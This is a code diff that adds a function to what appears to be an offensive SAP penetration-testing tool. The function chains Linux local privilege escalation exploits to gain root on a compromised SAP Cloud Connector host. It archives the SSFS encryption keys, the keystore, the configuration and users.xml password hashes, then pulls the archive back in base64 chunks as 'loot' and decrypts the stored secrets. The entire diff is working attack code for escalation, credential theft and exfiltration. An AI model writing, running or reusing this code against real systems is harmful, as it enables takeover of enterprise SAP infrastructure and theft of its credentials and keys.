@@ -597,6 +597,232 @@ def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
     return result
 
 
+def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
+    """Read /opt/sap/scc/config/users.xml as root by chaining the
+    existing Linux LPE.
+
+    Why this exists separately from ``harvest_scc_from_pwned_node``:
+    that function tries five exfil paths (REST backup, direct read,
+    sudo -n, group scc, /proc/<pid>/fd), all of which run as the
+    unprivileged sidadm and rely on a misconfiguration to succeed.
+    On a hardened SCC host none of them work — users.xml is mode 0600
+    owned by sccadm.  This function ignores those paths and uses the
+    Copy Fail / Dirty Frag LPE to *become* root, runs the same tar
+    command Path B/C/D builds, chowns the tar back to sidadm so the
+    standard sidadm exec channel can read it, then routes the bytes
+    through the same _save_and_parse pipeline ``harvest_scc`` uses —
+    so the loot lands at loot/scc/<host>/ and users.xml's bcrypt
+    hashes get parsed into the SCC node's hash list automatically.
+
+    Linux-only (Copy Fail / Dirty Frag are Linux LPE techniques);
+    refuses on Windows targets with a clear error.
+
+    Returns
+    -------
+    dict with: ok, method (copyfail/dirtyfrag), loot_path,
+    bytes_recovered, error.
+    """
+    from sapmap_findings import emit_finding
+
+    result = {"ok": False, "method": "", "loot_path": "",
+              "bytes_recovered": 0, "error": ""}
+
+    sid = node.sid
+    is_windows = "WIN" in (node.os_type or "").upper()
+    if is_windows:
+        result["error"] = ("Linux LPE escalation only — node OS is Windows; "
+                            "use the Windows LPE chain + a separate "
+                            "Windows-side harvest path instead.")
+        return result
+
+    # ---- Shared unprivileged exec channel (same shape as
+    # harvest_scc_from_pwned_node._run_cmd) — used to (a) discover SCC
+    # root + sidadm username, (b) read the tar back after root chowns
+    # it to sidadm:sapsys.
+    def _run_cmd(cmd: str) -> str:
+        try:
+            system_type = (node.system_type or "").upper()
+            if "JAVA" in system_type:
+                run_fn, _label, err = _build_java_os_exec(node)
+                if run_fn is None:
+                    return ""
+                r = run_fn("/bin/sh", f"-c '{cmd}'")
+            else:
+                r = run_os_command(node, "/bin/sh", f"-c '{cmd}'")
+            if r and r.get("success"):
+                lines = r.get("output") or []
+                if isinstance(lines, list):
+                    return "\n".join(str(x) for x in lines)
+                return str(lines)
+        except Exception as e:
+            logger.debug(
+                f"scc_hashes_via_lpe [{sid}]: cmd failed: "
+                f"{format_rfc_exception(e)}")
+        return ""
+
+    # ---- Phase 0: pre-flight — LPE must be viable BEFORE we touch SCC
+    try:
+        from sapmap_lpe_auto import check_linux_lpe, run_linux_lpe
+    except Exception as e:
+        result["error"] = (f"LPE auto-picker not importable: {e}; "
+                            f"this should never happen — module is "
+                            f"shipped with SAPMAP")
+        return result
+
+    lpe_state = check_linux_lpe(node)
+    method = lpe_state.get("method") or ""
+    if not method:
+        result["error"] = (
+            f"Linux LPE not viable on this host — Copy Fail and Dirty "
+            f"Frag both failed pre-checks. ({lpe_state.get('summary')}) "
+            f"Run Check Linux Root LPE first; if it still fails, the "
+            f"only path to users.xml is via SCC admin web credentials "
+            f"(use Probe Default Account / Set Credentials).")
+        return result
+    result["method"] = method
+    print(f"[*] {sid}: scc_hashes_via_lpe — LPE viable, picked '{method}'")
+
+    # ---- Phase 1: discover SCC install root + sidadm username
+    root_out = _run_cmd(
+        'for d in /opt/sap/scc /usr/local/scc '
+        '"/opt/SAP/Cloud Connector" /opt/sapscc '
+        '/opt/cloud-connector /opt/sap/cloud-connector; do '
+        '  if [ -d "$d/scc_config" ]; then '
+        '    echo "SCC_ROOT $d"; break; fi; done')
+    m_root = re.search(r'SCC_ROOT\s+(\S+)', root_out)
+    scc_root = m_root.group(1) if m_root else "/opt/sap/scc"
+    print(f"[*] {sid}: scc_hashes_via_lpe — SCC root={scc_root}")
+
+    sidadm = _run_cmd("whoami").strip().splitlines()
+    sidadm = sidadm[-1] if sidadm else f"{sid.lower()}adm"
+    sidadm = re.sub(r"[^a-zA-Z0-9_-]", "", sidadm) or f"{sid.lower()}adm"
+
+    # ---- Phase 2: escalate → tar as root → chown back to sidadm
+    staging = "/tmp/.scc_lpe_loot.tgz"
+    # Same file list Path B/C/D's _exfil_tar bundles — users.xml is
+    # already in there, so the existing _save_and_parse downstream
+    # picks up the bcrypt hashes for free.
+    tar_cmd = (
+        f"tar -czf {staging} "
+        f"{scc_root}/scc_config/SSFS_SCC.KEY "
+        f"{scc_root}/scc_config/SSFS_SCC.DAT "
+        f"{scc_root}/scc_config/scc.p12 "
+        f"{scc_root}/scc_config/scc_config.ini "
+        f"{scc_root}/config/users.xml 2>/dev/null || true; "
+        f"chown {sidadm}:sapsys {staging} 2>/dev/null; "
+        f"chmod 640 {staging}; "
+        f"wc -c < {staging}"
+    )
+    lpe_r = run_linux_lpe(node, tar_cmd, timeout=180)
+    if not lpe_r.get("ok"):
+        result["error"] = (
+            f"LPE ({method}) failed to run root tar: "
+            f"{lpe_r.get('error') or '(no error text)'}")
+        return result
+
+    # The wc -c at the end is our size signal — copyfail/dirtyfrag
+    # both return stdout from the wrapped command.
+    sz_match = re.search(r'(\d+)\s*$', (lpe_r.get("stdout") or "").strip())
+    sz = int(sz_match.group(1)) if sz_match else 0
+    if sz <= 0:
+        result["error"] = (
+            f"Root tar produced empty file at {staging} — most likely "
+            f"the SCC install root probe missed (tried {scc_root}); "
+            f"check that SCC is actually installed on this host.")
+        # cleanup attempt — best-effort
+        _run_cmd(f"rm -f {staging} 2>/dev/null")
+        return result
+
+    print(f"[*] {sid}: scc_hashes_via_lpe — root tar = {sz} B at {staging}")
+
+    # ---- Phase 3: read the tar back via the unprivileged channel
+    # (we chowned it to sidadm:sapsys so this just works)
+    import base64 as _b64
+    chunks = []
+    offset = 0
+    while offset < sz:
+        cb64 = _run_cmd(
+            f'dd if={staging} bs=1 skip={offset} count=3000 2>/dev/null '
+            f'| base64 | tr -d "\\n"').strip()
+        if not cb64:
+            break
+        chunks.append(cb64)
+        offset += 3000
+    _run_cmd(f"rm -f {staging} 2>/dev/null")
+    if not chunks:
+        result["error"] = (
+            f"Root tar succeeded ({sz} B written) but read-back chunked "
+            f"exfil returned no data — check the sidadm exec channel.")
+        return result
+
+    try:
+        raw = _b64.b64decode("".join(chunks))
+    except Exception as e:
+        result["error"] = f"base64 decode of root tar failed: {e}"
+        return result
+
+    # ---- Phase 4: persist + parse — same pipeline as Path A-E
+    import datetime as _dt
+    host_id = (node.ip or node.hostname or sid).replace("/", "_")
+    loot_dir = os.path.join("loot", "scc", host_id)
+    os.makedirs(loot_dir, exist_ok=True)
+    ts = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
+    loot_path = os.path.join(loot_dir, f"scc_loot_via_lpe_{ts}.tgz")
+    with open(loot_path, "wb") as fh:
+        fh.write(raw)
+    try:
+        os.chmod(loot_path, 0o600)
+    except Exception:
+        pass
+    result["loot_path"] = loot_path
+    result["bytes_recovered"] = len(raw)
+
+    method_label = f"LPE/{method} → root tar"
+    print(f"[+] {sid}: scc_hashes_via_lpe — loot saved → {loot_path} "
+          f"({len(raw)} B)")
+
+    emit_finding(
+        "CRITICAL", sid,
+        f"SCC config bundle (incl. users.xml bcrypt hashes) "
+        f"exfiltrated from {sid} via {method_label}: SSFS, scc.p12, "
+        f"users.xml recovered at {loot_path}",
+        ref="scc.harvest.loot_exfilled_via_lpe",
+        attack_capability="data.scc_users_dump_via_lpe",
+        meta={"loot_path": loot_path,
+              "size": len(raw),
+              "method": method_label,
+              "lpe_technique": method})
+
+    # SSFS decrypt + mappings parse + hash list — mirror what
+    # _save_and_parse does inside harvest_scc_from_pwned_node so the
+    # downstream UI surfaces (decrypted secrets list, mappings count,
+    # users.xml hash table) look identical regardless of which exfil
+    # path got us the bundle.
+    try:
+        from sapmap_scc_keystore import (
+            parse_ha_state_from_zip, parse_mappings_from_zip)
+        ha = parse_ha_state_from_zip(loot_path) or {}
+        if ha.get("peer_host"):
+            print(f"[*] {sid}: scc_hashes_via_lpe HA peer="
+                  f"{ha['peer_host']}")
+        maps = parse_mappings_from_zip(loot_path) or {}
+        if maps.get("mappings"):
+            print(f"[*] {sid}: scc_hashes_via_lpe mappings: "
+                  f"{len(maps['mappings'])} entries")
+    except Exception as pe:
+        logger.debug(f"scc_hashes_via_lpe parse error: {pe}")
+    try:
+        from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
+        dr = decrypt_and_unlock(loot_path)
+        if dr and dr.get("ok"):
+            print(f"[+] {sid}: scc_hashes_via_lpe SSFS decrypted")
+    except Exception as se:
+        logger.debug(f"scc_hashes_via_lpe ssfs decrypt: {se}")
+
+    result["ok"] = True
+    return result
+
+
 def harvest_scc_mappings_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
     """Read SCC mapping config from disk via OS-exec on co-located pwned node.
 
